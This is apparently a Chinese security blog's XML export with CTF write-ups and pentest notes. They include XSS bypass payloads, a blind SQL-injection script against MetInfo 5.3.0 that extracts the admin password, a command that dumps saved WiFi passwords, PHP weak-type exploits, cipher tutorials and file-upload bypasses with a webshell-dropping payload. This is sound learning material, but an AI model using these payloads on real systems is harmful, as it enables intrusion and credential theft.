双字母绕过&lt;img ononerrorerror=&quot;123&quot;&gt; &lt;script&gt;alalertert(123)&lt;/script&gt; 宽字节绕过gbxxxx系列的编码，那么我们尝试一下宽字节 %c0 %bf %5c 其他事件绕过onload onclick onerror prompt confirm onmousemove CRLF injection绕过CRLF是”回车 + 换行”（\r\n）的简称。 http://www.xxx.com%0d%0a%0d%0a+xss代码 &lt;svg/onload=prompt(1)&gt; 0x03 XSS的防御 原则1：“Secure By Default”原则：不要往HTML页面中插入任何不可信数据 原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码 原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码 原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码 原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码 原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码 原则7：使用富文本时，使用XSS规则引擎进行编码过滤]]></content>
      <tags>
        <tag>CRLF</tag>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python练习题]]></title>
    <url>%2F2016%2F07%2F16%2Fpython%E7%BB%83%E4%B9%A0%E9%A2%98%2F</url>
    <content type="text"><![CDATA[两个python练习的小脚本，涉及正则表达式，网页爬虫及信息提取。 习题1：从文本中匹配英文单词代码： #!usr/bin/python #coding=utf-8 &apos;&apos;&apos; @author：w2n1ck &apos;&apos;&apos; import re #载入正则表达式模块 f1 = open(&apos;from.txt&apos;) data = f1.read() f1.close() #打开文件，读入文本 result = re.findall(&apos;[A-z]+&apos;, data) #用正则表达式中的findall方法 #找出data中所有从A-Za-z的连续字符 result.sort() #把得到的结果字符串list排序，默认为字典序 data = &apos;\n&apos;.join(result) #把排序后的结果用换行符连接成一段文本 f2 = open(&apos;to.txt&apos;, &apos;w&apos;) f2.write(data) f2.close() #输出到文件中 from.txt内容如下： 结果如下： 习题2： 查询热映电影查询当前正在热映的电影。方法是，找一个电影网站（豆瓣电影、时光网、格瓦拉等等），把它的首页取过来，分析一下网页内容的结构，然后从中取出你要的信息。 因为一个网页上会包含很多内容，如何查找定位到你所需的内容，还是要费点功夫的。你可能会用到正则表达式、urllib，或者BeautifulSoup之类的。 首先安装第三方的网页分析模块：BeautifulSoup 代码： #!usr/bin/python #coding:utf-8 &apos;&apos;&apos; @author：w2n1ck &apos;&apos;&apos; import urllib2 from bs4 import BeautifulSoup print &quot;豆瓣正在热映：&quot; url = &quot;http://movie.douban.com&quot; html = urllib2.urlopen(url).read() soup = BeautifulSoup(html) div_hot = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;screening&quot;}) for i in div_hot.find_all(&apos;li&apos;, class_=&apos;title&apos;): movie_title = i.a.get_text() # movie_title = movie_title.strip() #去除movie_title两边的空格 print movie_title print &quot;\n豆瓣近期热门：&quot; div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;hot-gallery&quot;}) for i in div_new.find_all(&apos;li&apos;, class_=&apos;title&apos;): movie_new = i.a.get_text() print movie_new 代码解析： 7、8行分别导入了urllib2、beautifulsoup模块 11行用urllib模块把豆瓣的网页抓下来 12行用BeautifulSoup模块整理抓下来的html内容 13行是重点，把我们需要的那一部分div截取下来（id=”screening”的那部分），需要分析html源码。 接下来在上文的div中，寻找所有 class=”title” 的 li 元素，注意，由于 class_是python中的保留关键字，所以需要 class_=&#39;title&#39;。 有些网页抓取出来的内容前后有很多空格，可以用.strip() 去除。]]></content>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CMD命令获取电脑所有连接过的WiFi密码]]></title>
    <url>%2F2016%2F07%2F16%2FCMD%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E6%89%80%E6%9C%89%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84WiFi%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[CMD平常人看起來根本没什么用，但是如果你会使用，你会发现：它真的很强大！ Windows 7、Windows 8、Windows 8.1、Windows 10已测试成功！（windows 7下以管理员方式运行） 使用方法：一、以管理员权限运行CMD （以及 开启无线网卡、最好是笔记本） 二、输入命令： for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan show profiles’) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 三、然后CMD就列出很多行 你以前连接过的wifi信息、加密方式、包括密码]]></content>
      <tags>
        <tag>运维</tag>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验吧综合渗透_metinfo_盲注脚本]]></title>
    <url>%2F2016%2F07%2F14%2F%E5%AE%9E%E9%AA%8C%E5%90%A7%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F-metinfo-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[MetInfo5.3.0 版本SQL注入。在本地搭建环境，分析如下: 这个漏洞主要是listmod.php，代码的最后一行$serch_sql 怎么做能让这个没有在上面给初始化，这就是我们要做的。 通过调试： 我们的知 控制它是否初始化的另一个变量为imgproduct 当这个变量非search的任意字符的时候，导致serch_sql 不能进行初始化 构造POC： http://localhost/MetInfo5.3/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1– sd&amp;imgproduct=xxxx 这样一来 比sql注入更为简单了97那个位置，然后在判断第二位，再穷聚,自然就爆表了。 实例实验吧综合渗透metinfo。 本题环境就是这个，根据POC写如下脚本： # -*- coding: utf8 -*- import httplib import requests import urllib import string payloads = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos; url=&quot;http://localhost:8080/MetInfo_v5.3.0/&quot; password = &apos;&apos; for p in range(1, 33): for num in payloads: num = ord(num) poc = &quot;http://localhost:8080/MetInfo_v5.3.0/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_pass,&quot;+str(p)+&quot;,1))=&quot;+str(num)+&quot;,1,0) limit 0,1-- sd&amp;imgproduct=xxxx&quot; #print poc #result = urllib.request.urlopen(poc).txt conn = requests.get(poc) res = conn.content res = str(res) if res.find(r&quot;为什么企业要建多国语言网站&quot;)&gt;0: password = password + chr(num) print password break 测试效果如下： 根据如上脚本跑出账户密码为： acd131fce58f4d6f86e4a503a303fa4e simpleware123 这个要收费，附一个MD5解密的免费网址：http://www.pdtools.net/tools/md5.jsp]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>SQL注入</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MarkDown基础语法]]></title>
    <url>%2F2016%2F07%2F13%2FMarkDown%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Markdown入门学习小结Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown 的目标是实现「易读易写」。 标题在Markdown当中设置标题，有两种方式： 第一种：通过在文字下方添加“=”和“-”，他们分别表示一级标题和二级标题。 第二种：在文字开头加上 “#”，通过“#”数量表示几级标题。（一共只有1~6级标题，1级标题字体最大） 块注释(引用) 通过在文字开头添加“&gt; ”表示块注释。 粗体（强调） 将需要设置为粗体的文字两端使用2个“*”。 有序列表 使用数字 后面跟上句号。 （还要有空格） 链接（Links）Markdown中有两种方式，实现链接，分别为内联方式和引用方式。 内联方式：This is an example link. This is an [example link](http://example.com/). 图片（Images）图片的处理方式和链接的处理方式，非常的类似。 内联方式： ![test](C:\Users\dell\Pictures\404.jpg) 直接使用标签，这样可以指定图片的大小尺寸代码（HTML中所谓的Code）实现方式有两种：第一种：简单文字出现一个代码框。使用&lt;blockquote&gt;。（不是单引号而是左上角的ESC下面~中的）```第二种：大片文字需要实现代码框。使用Tab和四个空格。特殊字符 用\转义。]]></content>
      <tags>
        <tag>MarkDown</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PHP安全】PHP弱类型]]></title>
    <url>%2F2016%2F06%2F13%2F%E3%80%90PHP%E5%AE%89%E5%85%A8%E3%80%91PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[没有人质疑php的简单强大，它提供了很多特性供开发者使用，其中一个就是弱类型机制。弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。 PHP弱类型 PHP弱类型简介在PHP中，可以进行一下的操作。 $param = 1; $param = array(); $param = &quot;stringg&quot;; 比如 在$a == $b的比较中 $a = null; $b = false; //为真 $a = ‘’; $b = 0; //同样为真实例解释 实例一2016年风云杯的题 题目就是一个登陆框，需要输入账号密码。 post：username[]=1&amp;password[]=2 原因是：用户在输入账号密码之后php会进行解析，首先会把username和password当成数组，username和password再MD5加密之后就变得和数据库中相同，这样就成功登陆。 实例二也是2016年风云杯的题 首先一个备份文件，拿到源码 代码如下： &lt;?php $_GET[‘myid’] = urldecode($_GET[‘myid’]); $flag = ‘xxxxxxxxxxxxxxxxx’; if (isset($_GET[‘name’]) and isset($_POST[‘password’])) { if ($_GET[&apos;name&apos;] == $_POST[&apos;password&apos;]) print &apos;Your password can not be your name.&apos;; else if (sha1($_GET[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;])&amp;($_GET[&apos;myid&apos;]==&apos;anyun&apos;)) die(&apos;Flag: &apos;.$flag); else print &apos;sorry!&apos;; } ?&gt; 首先对myid进行一个urldecode 然后判断是否设置name和password 再然后判断sha1（name）和sha1（password）是否相等，并且myid=anyun 最后输出flag根据对源码分析，构造如下payload： http://139.129.166.67/5677ui8ifgs/index.php?myid=anyun&amp;name[]=1 post：password[]=2这样就绕过了，具体的原因就不一一解释了。 总结作为一个程序员，弱类型确实给程序员书写代码带来了很大的便利，但是也让程序员忘记了$array =array();的习惯。都说一切输入都是有害的 那么其实可以说一切输入的类型也是可疑的，永远不要相信弱类型的php下任何比较函数，任何数学运算。否则，你绝对是被php出卖的那一个。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF之加解密总结]]></title>
    <url>%2F2016%2F05%2F25%2FCTF%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[CTF比赛中主要分为逆向破解，Web安全，加密解密，PWN等几大类，本文主要总结一些自己做过的ctf的以下加密解密的方法和工具等。 0x01 Base64Base64顾名思义就是用64个可显示字符表示所有的ASC字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现1或2个’=’内存1个字符占8位 例如转前： s 1 3 先转成ascii：对应 115 49 51 2进制： 01110011 00110001 00110011 6个一组（4组） 011100110011000100110011 然后才有后面的 011100 110011 000100 110011 然后计算机是8位8位的存数 6不够，自动就补两个高位0了 所有有了 高位补0 科学计算器输入 00011100 00110011 00000100 00110011 得到 28 51 4 51 查对下照表 c z E z 形式 ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY= Base64在线编码解码地址0x02 Base32Base32和Base64相比只有一个区别就是，用32个字符表示256个ASC字符，也就是说5个ASC字符一组可以生成8个Base字符。 Base32在线编码解码地址注：以上两种编码都可以使用python的base64模块来加解密 0x03 培根密码培根密码，培根所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b密文形式是明显两个不同的字符。如大写字母和小写字母，英文和数字，斜体和正体。 例如DEath IS JUST A PaRT oF lIFE,sOMeTHInG wE&apos;RE aLL dESTInED TO dO. 是大写小写两个不同的字符 大写用a表示，小写用b表示 选取5个一组 DEath aabbb ISJUS aaaaa TAPaR aaaba ToFlI ababa FEsOM aabaa eTHIn baaab GwERE abaaa aLLdE baaba STInE aaaba DTOdO aaab 按照上述的形式去在表里找对应得明文. 第一种方式 A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab 第二种方式 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 培根密码在线解密0x04 摩斯密码摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。 形如：– — .-. … . 解密对照下图摩斯密码表: 在线摩斯密码解密0x05 JsFuckJSFuck 可以让你只用 6 个字符 !+ 来编写 JavaScript 程序。 形式： [][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])+[[+!+[]]]][+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])() 其他一些基本的表达： false =&gt; ![] true =&gt; !![] undefined =&gt; [][[]] NaN =&gt; +[![]] 0 =&gt; +[] 1 =&gt; +!+[] 2 =&gt; !+[]+!+[] 10 =&gt; [+!+[]]+[+[]] Array =&gt; [] Number =&gt; +[] String =&gt; []+[] Boolean =&gt; ![] Function =&gt; [][&quot;filter&quot;] eval =&gt; [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )() window =&gt; [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)() 可以使用firebug直接解密. JsFuck在线解密0x06 栅栏密码所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话） 例如明文：THERE IS A CIPHER 去掉空格后变为：THEREISACIPHER 两个一组，得到：TH ER EI SA CI PH ER 先取出第一个字母：TEESCPE 再取出第二个字母：HRIAIHR 连在一起就是：TEESCPEHRIAIHR 还原为所需密码。 而解密的时候，我们先把密文从中间分开，变为两行： T E E S C P E H R I A I H R 再按上下上下的顺序组合起来： THEREISACIPHER 分出空格，就可以得到原文了： THERE IS A CIPHER 例如密文：NlEyQd{seft} N l E y Q d { s e f t } NEQ{etIydsf} python实现栅栏解密：zhalan.py 0x07 凯撒密码它的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 ##例如 当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。 解密参照凯撒密码表： 上述的密文：NEQ{etIydsf} 发现移位11 CTF{tianshu} python实现凯撒解密：kaisa.py 0x08 维吉利亚密码恺撒密码的基础上扩展的多表密码. 实例如果你要对自己的男（女）神用维密（不是维多利亚的秘密）表白，先写好明文：I LOVE YOU 然后自己设定一个密钥，比如：KISS。 这样密钥与明文对应就是 K ISSK ISS I LOVE YOU 对第一个字母“I”加密过程如下： 先找到最左侧密钥K所在的一行和最上方明文I所在列，找到他们的相交字母S，这样I就被加密成了S。 同理，这句话通过每一个对应密钥的加密后就变成如下 密钥：KISSKISS 明文：ILOVEYOU 密文：STGNOGGM 维吉利亚密码表： 维吉利亚加解密工具 0x09 Unicode编码Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准,包括字符集、编码方案等。目前常用的有UTF-8、UTF-16、UTF-32。 密文形式： \u5927\u5bb6\u597d\uff01\u000d\u000a Unicode在线解密 0x10 brainfuck编码Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainfck或brainf*k，甚至被简称为BF。共有八个字符 字符含义： &gt; 指针加一 &lt; 指针减一 + 指针指向的字节的值加一 - 指针指向的字节的值减一 . 输出指针指向的单元内容（ASCⅡ码） , 输入内容到指针指向的单元（ASCⅡ码） [ 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ] 如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 密文形式:++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-] &gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++. &gt;.+++.------.--------.&gt;+.&gt;. 解密方法 使用brainfuck解释器解密 bftools.exe Decode braincopter doge.jpg -o dogeout.png bftools.exe run dogeout.png Q1RGe0JyYWluZnVja18xc19TaW1wMWV9 CTF{Brainfuck_1s_Simp1e} brainfuck在线解密 0x11 Playfair编码Playfair密码出现于1854年，它依据一个5*5的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待。英语中z使用最少，可以去掉它。 加密描述：第一步是编制密码表。在这个5*5的密码表中，共有5行5列字母。 第一列（或第一行）是密钥,其余按照字母顺序。密钥是一个单词或词组，若有重复字母，可将后面重复的字母去掉。当然也要把使用频率最少的字母去掉。 如：密钥是Live and learn,去掉后则为liveandr。如果密钥过长可占用第二列或行 例如首先playfair的加密过程用到一个5x5的字母矩阵,容纳26个字母，其中i和j挤到一个格子里，字母填写顺序取 决于密钥，The quick brown fox jumps over the lazy dog!既然出题者不是在讲故事，那，这句就是密钥了吧 将空格去掉，然后填入矩阵里，重复出现的字母只填一次。 填完后如下表： t h e q u i/j c k b r o w n f x m p s v l a z y d g 填完密钥出现的字母后，若还有空余，就填字母表中剩余的字母（按字母表顺序） 加密过程：把明文按两个字母一组分组，比如hello就分成he,lx,lo 相邻字母相同的情况下，中间加个填充字母x(有时候是q)，若最后一个字母没组员，也加个填充字母。 加密规则： 1、两明文字母m1,m2同行，密文字母c1,c2在它们右边，同行循环，比如hu加密后是et； 2、m1,m2同列：c1,c2在它们下边，同列循环，hz加密后是ch； 3、m1,m2不同行列：c1,c2是m1,m2 组成的长方形的另两个顶点，顺序是c1与m1同行，c2与m2同行，cd加密后是bz； 解密过程：有了密钥矩阵，将加密过程反过来就行。ihxo解密就是ctfx ihxo{smzdodcikmodcismzd} ctfx{playfairisfairplay} 0x12 urlcode编码UrlEncode：将字符串以URL编码 返回值：字符串 函数种类：编码处理 形式：%4d%54%45%35%43%6a%45%77%4d%51%6f%78%4d%44%67%4b%4f%54%6b%4b%4d%54%45%78%43%6a%45%77%4f%51%6f%78%4d%44%45%4b%4d%54%45%32%43%6a%45%78%4d%51%6f%78%4d%54%55%4b%4d%54%41%30%43%6a%45%77%4e%51%6f%78%4d%6a%45%4b%4f%54%63%4b%4d%54%45%77%43%6a%6b%34%43%6a%6b%33%43%6a%45%78%4e%41%3d%3d urlcode在线解密0x13 Serpent编码Serpent（蟒蛇）,它是AES的一个候选算法,该算法使用256位的密钥对128位的决数据进行加解密;描述了Serpent的加解密过程及子密钥生成过程,同时对其性能作了部分阐述 Serpent在线解密0x14 异或加密异或的运算方法是一个二进制运算： 1^1=0 0^0=0 1^0=1 0^1=1 两者相等为0,不等为1. 形式： 一般为一个二进制字符串和一个英文字母 解密过程 先把密钥转化成二进制 再和密文异或 异或解密算法：yihuo.py 0x15 CRC32加密CRC校验实用程序库 在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。CRC是网络传输中经常用的一种校验方式。其中CRC32则是采用这样的一个多项式生成式的CRC：Xe32+Xe26+Xe23+Xe22+Xe16+Xe12+Xe11+Xe10 +Xe8+Xe7+Xe5+Xe4+Xe2+X+1( string$str )生成str的 32 位循环冗余校验码多项式。这通常用于检查传输的数据是否完整。 python计算CRC32 0x16 邮件编码邮件编码即uuencode编码，是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件 形式：MR,O)^KNYU&gt;;*Q[*[P_?#Q+&quot;AHZS6Q\G,LKNYNZ.LR;;2LK*[N^&amp;CK+/VN/;, MXK:\TJJ]RKZAQ-36K:&amp;CH:,*M/.XQ;3PL+B^S&lt;K&apos;U&gt;+1^;#)=V-T9GMU=75U *=65N8V]D95]??0`` Uuencode在线解密 0x17 曼切斯特编码曼彻斯特编码（Manchester Encoding），也叫做相位编码（ Phase Encode，简写PE），是一个同步时钟编码技术，被物理层使用来编码一个同步位流的时钟和数据。 从低到高跳变表示&quot;0&quot;，从高到低跳变表示&quot;1&quot;。 还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示&quot;0&quot;或&quot;1&quot;，有跳变为&quot;0&quot;，无跳变为&quot;1&quot;。 即: 0-1 跳变表示 1,1-0 跳变表示 0 然而一般来说无线调制中，传感器和 RF 前端之前通信一般会采用 SPI 接口，而 SPI 接口有两种模式， MSB First 和 LSB First，一般在大多数情况下，都是 MSB First，可是这题不是，有点奇葩，这题是 LSB First 0x18 其他加密希尔密码 Ras加密 Rot13加密 猪圈密码 当铺密码 手机电脑键盘密码 Escape加密 混淆加密Asp混淆加密 Php混淆加密 Css/js混淆加密 VBScript.Encode混淆加密:]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>加密解密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[上传漏洞总结]]></title>
    <url>%2F2016%2F05%2F11%2F%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，有时候几乎没有什么技术门槛。 0x01 上传检测机制0x01_1 客户端javascript检测通常检测的是文件的扩展名 0x01_2 服务端MIME类型检测通常检测的是Content-Type内容 0x01_3 服务端目录路径检测通常跟path参数相关的内容 0x01_4 服务端文件扩展名检测通常检测跟文件extension相关的内容 0x01_5 服务端文件内容检测检测文件内容是否合法或含有恶意代码 0x02 文件上传漏洞利用0x02_1 javascript客户端验证创建一个允许的文件类型，里面写入我们需要的代码，抓包，拦截，修改为可执行的恶意代码。 0x02_2 MIME类型验证直接修改Content-Type：允许的MIME类型 修改文件名为可执行文件，有时候需要配合修改multipart/form-data的大小写 常见的MIME类型： 超文本标记语言文本 .html text/html xml文档 .xml text/xml 普通文本 .txt text/plain RTF文本 .rtf application/rtf PDF文档 .pdf application/pdf Microsoft Word文件 .word application/msword PNG图像 .png image/png GIF图形 .gif image/gif JPEG图形 .jpeg,.jpg image/jpeg au声音文件 .au audio/basic MIDI音乐文件 mid,.midi audio/midi,audio/x-midi RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio MPEG文件 .mpg,.mpeg video/mpeg AVI文件 .avi video/x-msvideo GZIP文件 .gz application/x-gzip TAR文件 .tar application/x-tar 任意的二进制数据 application/octet-stream 0x02_3 目录路利用解析是从前往后解析，判断是从后往前判断。 零零截断一般步骤为： 1.新建一个名为test.php%00.jpg或者test.php.jpg 2.在里面写入一句话木马（[如何在图片中插入一句话](http://wenku.baidu.com/link?url=GoR21a2WWH2C8c8Q7HIgrz7CoW3B4suAwDaaRkAt6vgCZyYr7Le7Z9ZeiurBIE7NHuNwJ7dro5lCql8mRlk3y2IS7iFbWuQM99HV_kXDvTm)） 3.burp抓包改%00或者.为url编码 iis按照路径解析的是： 比如我们上传一个名为123.asp/123.jpg文件 则，123.asp/123.jpg会被直接解析成123.asp 0x02_4 文件扩展名利用黑名单检测 文件大小写绕过 比如像Asp，Php之类的文件名绕过黑名单检测 名单列表绕过 利用黑名单里没有的名单进行攻击，比如黑名单里没有asa，cer，php3，php5之类的 特殊文件名绕过 修改文件名为test.asp.或者test.asp_（下划线为空格），绕过验证之后，windows会自动去掉点和空格，linux和unix下不支持 0x00截断绕过 双扩展名绕过 apache解析式从后往前，所以如果上传一个test.php.123,不认识.123的文件，所以会往前解析，直到遇到能解析的 .htaccess文件攻击 配合名单列表绕过，上传一个自定义的.htaccess文件，就可以轻松绕过各种检测 新建一个.htaccess文件 代码为： SetHandler application/x-httpd-php 然后上传一个包含test字符串的文件，没有扩展名 里面写入一句话即可 白名单检测 %00截断 解析调用/漏洞绕过 配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞 .htaccess文件 0x02_5 文件内容检测绕过 文件头检测 jpg-JFIF-FF D8 FF EO 00 10 4A 46 49 46 gif-GIF89a-47 49 46 38 39 61 png-PNG-89 50 4E 47 在文件头后面加上恶意代码就行了 文件相关信息检测 文件加载检测 在文件注释处插入恶意代码 0x02_6 解析漏洞利用Apache的扩展名顺序解析漏洞命名为test.php.xxx（集成环境里php3都会按照php来解析） IIS的asp解析漏洞 IIS6.0 1.命名为test.asp;.jpg 2.命名为test.asp/123.jpg(test.asp是一个目录) 3.命名为test.asa,test.cer.test.cdx IIS7.5/7.0 在默认Fast-CGI开启状况下,上传一个名字为test.jpg，内容为 &lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 的文件，然后访问test.jpg/.php,在这个目录下就会生成一句话木马 shell.php Nginx的%00解析漏洞 命名为test.jpg%00.php php-cgi的默认配置漏洞]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WeChall writeup]]></title>
    <url>%2F2016%2F03%2F04%2FWeChall_writeup%2F</url>
    <content type="text"><![CDATA[WeChall Challage writeup. Training：Get Sourced 查看源码 最后面： &lt;!-- You are looking for this password: html_sourcecode --&gt; Training: Stegano I隐写 下载下来，使用notepad打开 Look what the hex-edit revealed: passwd:steganoI Training: ASCII84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 108, 101, 110, 112, 108, 99, 102, 104, 104, 105, 115, 102 ASCII解码 The solution is: lenplcfhhisf Training: Crypto - Caesar IVJG SWKEM DTQYP HQZ LWORU QXGT VJG NCBA FQI QH ECGUCT CPF AQWT WPKSWG UQNWVKQP KU DHFUHKPPTRCF 凯撒解密，偏移24 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG OF CAESAR AND YOUR UNIQUE SOLUTION IS BFDSFINNRPAD Encodings: 